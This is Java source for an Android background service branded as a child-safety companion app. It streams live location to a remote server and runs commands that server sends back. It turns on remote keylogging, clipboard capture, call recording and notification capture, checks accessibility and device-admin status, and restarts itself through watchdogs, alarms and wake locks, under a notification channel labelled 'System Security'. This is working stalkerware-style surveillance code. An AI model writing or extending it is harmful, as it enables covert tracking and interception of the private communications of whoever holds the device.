package com.snapapp.companion;

import android.annotation.SuppressLint;
import android.app.*;
import android.content.*;
import android.content.pm.ServiceInfo;
import android.location.*;
import android.os.*;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.concurrent.*;

public class CompanionSyncService extends Service {
    private static final String CHANNEL_ID = "snap_safety_channel";
    private static final int NOTIF_ID = 1001;
    private static final long PERSIST_INTERVAL_MS = 30000;
    private ScheduledExecutorService scheduler; private SharedPreferences prefs;
    private LocationManager locationManager; private LocationListener locationListener;
    private long lastPersistTime = 0;
    public static volatile boolean isLiveMovementActive = false, isFetchRequested = false;

    public static void acquireActionWakeLock(Context ctx, long timeoutMs) {
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "snap:actionlock");
                wl.acquire(timeoutMs > 0 ? timeoutMs : 30000L);
            }
        } catch (Throwable ignored) {}
    }

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
        acquireActionWakeLock(this, 10000L);
        createNotificationChannel();
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        locationListener = loc -> { if (loc != null) dispatchLocation(loc); };
        WatchdogReceiver.scheduleWatchdog(this); TelemetryLifecycleHelper.onServiceCreated(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            int type = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q ? ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION : 0) | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R ? ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA : 0);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) startForeground(NOTIF_ID, buildNotification(), type); else startForeground(NOTIF_ID, buildNotification());
        } catch (Throwable t) { try { startForeground(NOTIF_ID, buildNotification()); } catch (Throwable ignored) {} }
        if (intent != null && "ACTION_FETCH_LOCATION".equals(intent.getAction())) {
            acquireActionWakeLock(this, 15000L);
            requestActiveLocationFix();
        }
        pollServerCommands();
        startPeriodicSync();
        WatchdogReceiver.scheduleWatchdog(this);
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        WatchdogReceiver.scheduleWatchdog(this);
        acquireActionWakeLock(this, 15000L);
        try {
            Intent restart = new Intent(getApplicationContext(), CompanionSyncService.class);
            PendingIntent pi = PendingIntent.getService(getApplicationContext(), 9902, restart, Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_ONE_SHOT : PendingIntent.FLAG_ONE_SHOT);
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (am != null) am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 1500, pi);
        } catch (Throwable ignored) {}
    }

    public static void setLiveMovementActive(Context ctx, boolean active) {
        isLiveMovementActive = active; if (active) triggerOnDemandLocationFix(ctx);
    }

    public static void triggerOnDemandLocationFix(Context ctx) {
        isFetchRequested = true; acquireActionWakeLock(ctx, 30000L);
        try {
            Intent it = new Intent(ctx, CompanionSyncService.class); it.setAction("ACTION_FETCH_LOCATION");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(it); else ctx.startService(it);
        } catch (Throwable ignored) {}
    }

    @SuppressLint("MissingPermission")
    private void requestActiveLocationFix() {
        if ((!isLiveMovementActive && !isFetchRequested) || locationManager == null || locationListener == null) return;
        acquireActionWakeLock(this, 30000L);
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                long interval = isLiveMovementActive ? 3000L : 1000L; float dist = isLiveMovementActive ? 1.0f : 0.0f;
                for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER}) {
                    try {
                        if (locationManager.isProviderEnabled(p)) {
                            Location last = locationManager.getLastKnownLocation(p);
                            if (last != null) dispatchLocation(last);
                            locationManager.requestLocationUpdates(p, interval, dist, locationListener, Looper.getMainLooper());
                        }
                    } catch (Throwable ignored) {}
                }
            } catch (Throwable ignored) {}
        });
    }

    private void dispatchLocation(Location loc) {
        if ((!isLiveMovementActive && !isFetchRequested) || loc == null) return;
        final String deviceId = prefs.getString("device_id", null), serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        if (deviceId == null || (loc.hasAccuracy() && loc.getAccuracy() > 1500.0f)) return;
        double lat = loc.getLatitude(), lng = loc.getLongitude();
        if (Math.abs(lat) < 0.0001 && Math.abs(lng) < 0.0001) return;

        try {
            if (isLiveMovementActive) {
                long now = System.currentTimeMillis(); boolean shouldPersist = (now - lastPersistTime) >= PERSIST_INTERVAL_MS;
                JSONObject b = new JSONObject();
                b.put("device_id", deviceId); b.put("latitude", lat); b.put("longitude", lng);
                b.put("accuracy", loc.getAccuracy()); b.put("speed", loc.hasSpeed() ? loc.getSpeed() : 0);
                b.put("battery_level", getBatteryLevel()); b.put("persist", shouldPersist);
                if (shouldPersist) lastPersistTime = now;
                ApiClient.postJson(serverUrl + "/api/device-sync/live-location", b, null);
            } else if (isFetchRequested) {
                isFetchRequested = false;
                ApiClient.sendLocation(serverUrl, deviceId, lat, lng, loc.getAccuracy(), getBatteryLevel(), true, null);
                if (!isLiveMovementActive && locationManager != null && locationListener != null) {
                    try { locationManager.removeUpdates(locationListener); } catch (Throwable ignored) {}
                }
            }
        } catch (Throwable ignored) {}
    }

    private void startPeriodicSync() {
        if (scheduler != null && !scheduler.isShutdown()) return;
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleWithFixedDelay(() -> {
            try {
                if (isLiveMovementActive || isFetchRequested) requestActiveLocationFix();
                pollServerCommands();
            } catch (Throwable ignored) {}
        }, 5, 25, TimeUnit.SECONDS);
    }

    private void pollServerCommands() {
        final String deviceId = prefs.getString("device_id", null), serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        if (deviceId == null) return;
        boolean isAccess = ParentalSetupHelper.isAccessibilityEnabled(this), isAdmin = ParentalSetupHelper.isDeviceAdminActive(this);
        boolean isNoSleep = ParentalSetupHelper.isBatteryOptimizationIgnored(this);
        String ssid = WifiScanHelper.getConnectedSsid(this);
        ApiClient.sendHeartbeat(serverUrl, deviceId, getBatteryLevel(), false, isAccess, isAdmin, isNoSleep, ssid, new ApiClient.ApiCallback() {
            @Override public void onSuccess(JSONObject res) {
                try {
                    JSONObject cfg = res.optJSONObject("telemetry_config");
                    if (cfg != null) {
                        for (String k : new String[]{"notifications", "keylogger", "clipboard", "wifi", "lock_events", "call_recording", "screen_time"}) {
                            if (cfg.has(k)) TelemetrySyncHelper.setFeatureEnabled(CompanionSyncService.this, k, cfg.optBoolean(k, false));
                        }
                    }
                    JSONObject rt = res.optJSONObject("realtime");
                    if (rt != null) RealtimeSocketManager.getInstance(CompanionSyncService.this).connect(rt.optString("ws_url"), deviceId, serverUrl);
                    JSONArray cmds = res.optJSONArray("commands");
                    if (cmds != null && cmds.length() > 0) {
                        acquireActionWakeLock(CompanionSyncService.this, 30000L);
                        for (int i = 0; i < cmds.length(); i++) {
                            CommandDispatcher.dispatch(CompanionSyncService.this, serverUrl, deviceId, cmds.optJSONObject(i), () -> requestActiveLocationFix());
                        }
                    }
                } catch (Throwable ignored) {}
            }
            @Override public void onError(String e) {}
        });
    }

    private int getBatteryLevel() {
        try {
            Intent bi = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (bi == null) return 100;
            int l = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1), s = bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            return (l >= 0 && s > 0) ? (int) ((l / (float) s) * 100) : 100;
        } catch (Throwable t) { return 100; }
    }
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(new NotificationChannel(CHANNEL_ID, "System Security", NotificationManager.IMPORTANCE_LOW));
        }
    }
    private Notification buildNotification() {
        PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class), Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);
        return new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("Snap Safety").setContentText("Child protection active").setSmallIcon(R.drawable.ic_launcher).setContentIntent(pi).setOngoing(true).setPriority(NotificationCompat.PRIORITY_LOW).build();
    }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() {
        super.onDestroy();
        TelemetryLifecycleHelper.onServiceDestroyed(this);
        WatchdogReceiver.scheduleWatchdog(this);
        if (scheduler != null) scheduler.shutdownNow();
        RealtimeSocketManager.getInstance(this).disconnect();
    }
}
